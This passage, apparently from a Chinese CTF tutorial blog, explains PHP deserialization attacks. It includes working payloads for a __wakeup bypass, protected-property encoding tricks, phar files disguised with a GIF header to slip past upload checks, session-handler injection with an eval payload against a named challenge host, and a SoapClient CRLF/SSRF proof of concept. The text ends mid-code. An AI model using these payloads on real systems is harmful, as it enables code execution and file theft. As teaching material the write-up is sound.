<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>

<p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p>
<img src="http://img.kawhi.xyz/image-20200711123022767.png" style="high:80%;width:80%;" />

<p>可以看到直接导致xss攻击，如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>那么就是任意代码执行，危害就更大了。</p>
<p>把<code>echo()</code>修改为<code>eval()</code>，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>传入<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<p>可以看到已经成功执行php代码。</p>
<img src="http://img.kawhi.xyz/image-20200711123529023.png" style="high:80%;width:80%;" />

<h2 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a><strong>一些知识点</strong></h2><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a><strong>wakeup绕过</strong></h3><p>这是在攻防世界刷到的一题，通过这道题认识怎么绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里首先有两个要绕过的点</p>
<p>第一个点是<code>__wakeup()</code>，因为这里正常反序列化会写死<code>$this-&gt;ﬁle</code>属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会过<code>wakeup()</code>。</p>
<p>第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是<code>O:4</code>，直接使用+号当做空格即可绕过，即<code>O:+4</code>即可绕过。</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a><strong>私有属性绕过</strong></h3><p>首先来看看这样一段代码</p>
<img src="http://img.kawhi.xyz/image-20200711220816401.png" style="high:70%;width:70%;" />

<p>这里要注意</p>
<ul>
<li>private会在属性名前面产生<code>&lt;0x00&gt;类名&lt;0x00&gt;</code>，也就是<code>%00类名%00</code></li>
<li>protected会在属性名前面产生<code>&lt;0x00&gt;*&lt;0x00&gt;</code>，也就是<code>%00*%00</code></li>
<li><code>%00</code>其ascii为0</li>
</ul>
<p>通过这个题目理解一下如何绕过私有属性，这是一道网鼎杯青龙组名为AreUSerialz的反序列化的题目，源码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要进行文件读取来读取flag。</p>
<p>首先需要绕过<code>is_valid()</code>函数，因为<code>protected</code>类型的属性的序列化字符串包含不可见字符<code>%00</code>，会被<code>is_valid()</code>函数给ban掉。</p>
<p>这里非预期的话是直接用<code>public</code>就可以绕过，因为php7.1+版本对属性类型不敏感。</p>
<p>预期解的话是让用S来代替s，此时后面的字符串支持16进制表示，在这种情况下<code>%00</code>就会被解析成<code>\00</code>(3个字符)，因为在<code>is_valid()</code>中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此<code>\00</code>会被解析为三个字符，且都在允许的范围内，因此可以成功绕过。</p>
<p>需要绕过析构方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为在进行<code>read()</code>之前就会调用<code>__destruct()</code>魔术方法，如果<code>$this-&gt;op === &quot;2&quot;</code>就会设置<code>$this-&gt;op</code>为<code>&quot;1&quot;</code>，而<code>&quot;1&quot;</code>是不能调用<code>read()</code>来文件读取的。可以发现：</p>
<ul>
<li><code>__destruct()</code>方法内使用了严格相等<code>$this-&gt;op === &quot;2&quot;</code></li>
<li><code>process()</code>方法内使用了不严格相等<code>else if ($this-&gt;op == &quot;2&quot;)</code></li>
</ul>
<p>所以这里使用弱类型<code>2 == &quot;2&quot;</code>绕过即可。</p>
<p>然后构造序列化代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler(<span class="string">&quot;&quot;</span>);</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">&quot;\00&quot;</span>,<span class="string">&#x27;\00&#x27;</span>,$s);</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s:&quot;</span>,<span class="string">&#x27;S:&#x27;</span>,$b);</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>直接提交就能得到flag。</p>
<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a><strong>phar反序列化</strong></h3><p>首先来认识一下什么是phar</p>
<p>在php&gt;=5.3的时候，默认开启支持Phar，文件状态问为只读，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。</p>
<p>漏洞产生的原因</p>
<p>使用<code>Phar://</code>伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<p>这里贴一下受影响的文件系统函数列表。</p>
<img src="http://img.kawhi.xyz/image-20200711232201316.png" style="high:80%;width:80%;" />

<p>举一个小栗子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成phar 文件的格式</span></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话需要把php.ini的;phar.readonly = On改为phar.readonly = Off，否则无法生成phar文件。</p>
<img src="http://img.kawhi.xyz/image-20200711232430900.png" style="high:80%;width:80%;" />

<p>可以看到已经成功输出字符。当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了攻击面。</p>
<p><strong>phar的伪造</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成的phar.phar格式是gif文件，能够绕过很大一部分上传检测。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\phpStudy\PHPTutorial\WWW</span><br><span class="line">λ file phar.phar</span><br><span class="line">phar.phar: GIF image data, version <span class="number">89</span>a, <span class="number">16188</span> x <span class="number">26736</span></span><br></pre></td></tr></table></figure>

<p>利用的条件</p>
<ul>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为”跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ul>
<h3 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a><strong>SESSION反序列化</strong></h3><p>基本知识</p>
<p>首先要知道是PHP session 的引擎的差异, 这也是导致这个漏洞的根本原因和利用条件</p>
<p><strong>PHP session 的存储机制</strong></p>
<ul>
<li>session.serialize_handler 三种引擎</li>
</ul>
<table>
<thead>
<tr>
<th align="left">处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php</td>
<td>键名 + 竖线 + 经过 serialize() 函数序列化处理的值</td>
</tr>
<tr>
<td align="left">php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值</td>
</tr>
<tr>
<td align="left">php_serialize</td>
<td>经过serialize()函数序列化处理的数组</td>
</tr>
</tbody></table>
<p>这里通过一道来自浙大的题目来理解这个知识点</p>
<p>题目地址：<a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784</a></p>
<p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一眼看觉得比较简单</p>
<p>当创建<code>OowoO()</code>这个类的对象时，会自动调用<code>__construct()</code>这个魔术方法，给mdzz这个变量赋值为phpinfo()，然后程序执行结束后会自动调用<code>__destruct</code>这个魔术方法，触发了<code>eval()</code>，但问题就是没有反序列化函数啊。</p>
<p>然后看到题目中有这个东西</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>考虑到可能是序列化引擎不同导致的session反序列漏洞</p>
<p>然后查看一下phpinfo的信息</p>
<img src="http://img.kawhi.xyz/image-20200711211409836.png" style="high:80%;width:80%;" />

<p>发现存储和读取session时用到的处理器引擎不一样。</p>
<p>现在有个问题，session是怎么传进去的呢，平时都是有个<code>$_SESSION=$_GET[&#39;a&#39;]</code>，通过参数a传进去，本题没有$_SESSION进行变量赋值，这种情况我们可以用php文件上传进度来解决。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200711211709331.png" style="high:80%;width:80%;" />

<p>session.upload_progress.enabled刚好都是开启的。我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候，PHP会将文件名保存在$_SESSION中。</p>
<p>于是这里我们构造表单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;form action =<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method =<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;hidden&quot;</span> name =<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value =<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;file&quot;</span> name =<span class="string">&quot;file&quot;</span>/&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;submit&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>接着构造一个序列化的数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize.handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz = <span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将payload改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print_r(scandir(dirname(__FILE__)));</span><br><span class="line"><span class="comment">#序列化后的结果</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>scandir目录中的文件和目录</li>
<li>dirname函数返回路径中的目录部分</li>
<li><code>__FILE__</code> php中的魔法常量,文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名</li>
</ul>
<p>为防止双引号被转义，在双引号前加上\，除此之外还要加上|</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后得到文件名Here_1s_7he_fl4g_buT_You_Cannot_see.php</p>
<p>得到文件名之后还得查看路径，在phpinfo里面查看</p>
<img src="http://img.kawhi.xyz/image-20200711213050621.png" style="high:80%;width:80%;" />

<p>得到路径之后改下payload即可得到flag。</p>
<img src="http://img.kawhi.xyz/image-20200711213202557.png" style="high:80%;width:80%;" />

<h3 id="反序列化原生类的利用"><a href="#反序列化原生类的利用" class="headerlink" title="反序列化原生类的利用"></a><strong>反序列化原生类的利用</strong></h3><p>什么情况需要考虑原生类呢，题目找不到POP链的时候可以考虑PHP原生类。</p>
<h4 id="call的原生类"><a href="#call的原生类" class="headerlink" title="__call的原生类"></a>__call的原生类</h4><p>SoapClient算是目前被比较好用的一个内置类，php5、7都存在此类。正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。</p>
<p>先来看这样一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://134.175.168.213:5555/path&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200712162931204.png" style="high:80%;width:80%;" />

<p>可以看出，SOAPAction处可控，这里要注意的是如果Content-Type在SOAPAction的上面，就无法控制Content-Type，也就不能控制POST的数据，这里的局限性就是仅限于http/https协议，但是这里http头部还存在crlf漏洞，可以把<code>\r\n</code>即<code>%0d%0a</code>注入到SOAPAction，POST请求的header就可以被控制。</p>
<p>这里贴一下wupco师傅的poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://134.175.168.213:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=kawhi&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$a = 